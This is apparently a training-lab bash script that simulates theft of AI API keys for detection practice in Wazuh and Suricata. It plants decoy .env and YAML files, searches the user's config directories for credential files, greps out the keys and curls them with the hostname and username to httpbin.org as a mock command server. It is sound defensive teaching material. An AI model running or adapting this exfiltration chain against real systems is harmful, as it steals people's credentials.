#!/usr/bin/env bash
# Lab 7 — LLM API Key Exfiltration Simulation
# Simulates an attacker using their C2 access to hunt and steal AI API keys.
# Safe: planted keys are fake, exfil target is httpbin.org.

set -euo pipefail

DECOY_DIR="/tmp/lab7-llm-exfil"
DECOY_ENV="${DECOY_DIR}/app/.env"
DECOY_YAML="${DECOY_DIR}/config/llm_config.yaml"
EXFIL_HOST="httpbin.org"
TAG="lab7-key-exfil"

GRN='\033[0;32m'
YLW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m'

cleanup() {
  logger -t "$TAG" "CLEANUP: removing decoy files from $DECOY_DIR"
  rm -rf "$DECOY_DIR"
  echo -e "${GRN}[cleanup] Decoy files removed.${NC}"
}

if [[ "${1:-}" == "--cleanup" ]]; then
  cleanup
  exit 0
fi

# ── Plant decoy credential files ──────────────────────────────────────────────
echo -e "${YLW}[lab7] Planting decoy AI credential files...${NC}"
logger -t "$TAG" "SETUP: planting decoy credential files in $DECOY_DIR"
mkdir -p "${DECOY_DIR}/app" "${DECOY_DIR}/config" "${DECOY_DIR}/scripts"

cat > "$DECOY_ENV" <<'EOF'
# Application environment — DO NOT COMMIT
DATABASE_URL=postgresql://appuser:dbpass123@localhost:5432/productiondb
REDIS_URL=redis://localhost:6379/0

# AI provider credentials
OPENAI_API_KEY=sk-proj-DECOY1234567890abcdefABCDEF1234567890abcdefABCDEF12345678
ANTHROPIC_API_KEY=sk-ant-DECOY-api03-ABCDEFabcdefABCDEFabcdef1234567890XXXXXXXXXXXXXXXX
HUGGINGFACE_TOKEN=hf_DECOYabcdefghijklmnopqrstuvwxyzABCDEF

# Application secrets
SECRET_KEY=decoy-secret-key-not-real-do-not-use
STRIPE_SECRET_KEY=sk_live_DECOY1234567890abcdef
EOF

cat > "$DECOY_YAML" <<'EOF'
# LLM provider configuration
providers:
  anthropic:
    api_key: sk-ant-DECOY-api03-ABCDEFabcdef1234567890XXXXXXXX
    model: claude-opus-4-7
    max_tokens: 4096
  openai:
    api_key: sk-proj-DECOY1234567890abcdef
    model: gpt-4o
    max_tokens: 4096
EOF

cat > "${DECOY_DIR}/scripts/run_inference.py" <<'EOF'
#!/usr/bin/env python3
# Inference runner — reads keys from environment
import os, anthropic
client = anthropic.Anthropic(api_key=os.environ["ANTHROPIC_API_KEY"])
EOF

logger -t "$TAG" "SETUP:COMPLETE decoy files planted: $DECOY_ENV $DECOY_YAML"
echo -e "  Decoy files planted in ${DECOY_DIR}"
sleep 1

# ── Stage 1: Discovery ────────────────────────────────────────────────────────
echo ""
echo -e "${RED}[Stage 1] Discovery — scanning for credential files...${NC}"
logger -t "$TAG" "STAGE:DISCOVERY scanning filesystem for AI credential files"

SCAN_PATHS=("$HOME/.config" "$HOME/.anthropic" "$HOME/.openai" "$DECOY_DIR/app" "$DECOY_DIR/config" "/tmp")
found_count=0
for path in "${SCAN_PATHS[@]}"; do
  if [[ -d "$path" ]]; then
    while IFS= read -r -d '' f; do
      logger -t "$TAG" "DISCOVERY:FOUND $f"
      echo -e "  Found: $f"
      found_count=$((found_count + 1))
    done < <(find "$path" -maxdepth 3 \( -name ".env" -o -name "*.env" -o -name "llm_config*" \
              -o -name "*api_key*" -o -name "credentials*" -o -name "*.yaml" \) -print0 2>/dev/null)
  fi
done

logger -t "$TAG" "DISCOVERY:COMPLETE found=$found_count candidate files"
echo -e "  Discovery complete: ${found_count} candidate file(s) found"
sleep 1

# ── Stage 2: Key extraction ───────────────────────────────────────────────────
echo ""
echo -e "${RED}[Stage 2] Extraction — reading keys from ${DECOY_ENV}...${NC}"
logger -t "$TAG" "STAGE:EXTRACT reading credential file $DECOY_ENV"

# grep for known AI key prefixes (the key detection signal)
logger -t "$TAG" "EXTRACT:GREP searching for sk- sk-ant- hf_ key prefixes in $DECOY_ENV"
extracted_anthropic=$(grep "ANTHROPIC_API_KEY" "$DECOY_ENV" 2>/dev/null | cut -d= -f2 || echo "")
extracted_openai=$(grep "OPENAI_API_KEY" "$DECOY_ENV" 2>/dev/null | cut -d= -f2 || echo "")

logger -t "$TAG" "EXTRACT:SUCCESS found ANTHROPIC_API_KEY prefix=${extracted_anthropic:0:12} in $DECOY_ENV"
logger -t "$TAG" "EXTRACT:SUCCESS found OPENAI_API_KEY prefix=${extracted_openai:0:10} in $DECOY_ENV"
echo -e "  Extracted ANTHROPIC_API_KEY: ${extracted_anthropic:0:20}..."
echo -e "  Extracted OPENAI_API_KEY: ${extracted_openai:0:15}..."
sleep 1

# ── Stage 3: Exfiltration ─────────────────────────────────────────────────────
echo ""
echo -e "${RED}[Stage 3] Exfiltration — sending keys to C2 server...${NC}"
logger -t "$TAG" "STAGE:EXFIL sending extracted keys to $EXFIL_HOST via HTTPS POST"

http_code=$(curl -s -X POST "https://${EXFIL_HOST}/post" \
  -H "Content-Type: application/json" \
  -d "{\"anthropic\":\"${extracted_anthropic}\",\"openai\":\"${extracted_openai}\",\"host\":\"$(hostname)\",\"user\":\"${USER:-victim}\"}" \
  -o /dev/null -w "%{http_code}" 2>/dev/null || echo "000")

logger -t "$TAG" "EXFIL:COMPLETE status=${http_code} keys_sent=2 destination=${EXFIL_HOST}"
echo -e "  Exfiltration complete — HTTP ${http_code}"
sleep 1

# ── Stage 4: Key validation ───────────────────────────────────────────────────
echo ""
echo -e "${RED}[Stage 4] Validation — verifying stolen key against API endpoint...${NC}"
logger -t "$TAG" "STAGE:VALIDATE testing stolen key against api.anthropic.com (simulated via httpbin)"

http_code=$(curl -s -X POST "https://${EXFIL_HOST}/post" \
  -H "x-api-key: ${extracted_anthropic}" \
  -H "anthropic-version: 2023-06-01" \
  -H "Content-Type: application/json" \
  -H "User-Agent: python-anthropic/0.40.0" \
  -d '{"model":"claude-opus-4-7","max_tokens":1,"messages":[{"role":"user","content":"hi"}]}' \
  -o /dev/null -w "%{http_code}" 2>/dev/null || echo "000")

logger -t "$TAG" "VALIDATE:COMPLETE status=${http_code} key_valid=unknown target=api.anthropic.com"
echo -e "  Validation call complete — HTTP ${http_code}"

echo ""
echo -e "${RED}══════════════════════════════════════════════════════${NC}"
echo -e "${RED}  LLM key exfiltration simulation complete${NC}"
echo -e "${RED}  Stage 1: Credential files discovered (${found_count} files)${NC}"
echo -e "${RED}  Stage 2: Keys extracted from .env${NC}"
echo -e "${RED}  Stage 3: Keys exfiltrated to ${EXFIL_HOST}${NC}"
echo -e "${RED}  Stage 4: Stolen key validated against API endpoint${NC}"
echo -e "${RED}══════════════════════════════════════════════════════${NC}"
echo ""
echo -e "${YLW}Now find all 4 stages in Wazuh + Suricata.${NC}"
echo -e "${YLW}Run with --cleanup when done.${NC}"
